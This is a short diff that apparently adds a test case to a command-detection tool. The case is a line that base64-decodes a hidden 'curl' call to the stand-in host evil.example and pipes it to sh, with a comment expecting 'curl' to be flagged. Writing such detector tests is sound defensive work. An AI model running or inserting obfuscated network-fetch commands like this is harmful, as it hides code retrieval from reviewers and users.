@@ -1,0 +1,2 @@
+# expect: curl
+env HTTP_PROXY=1 bash -c "echo Y3VybCBodHRwOi8vZXZpbC5leGFtcGxlL3guc2g= | base64 -d | sh"
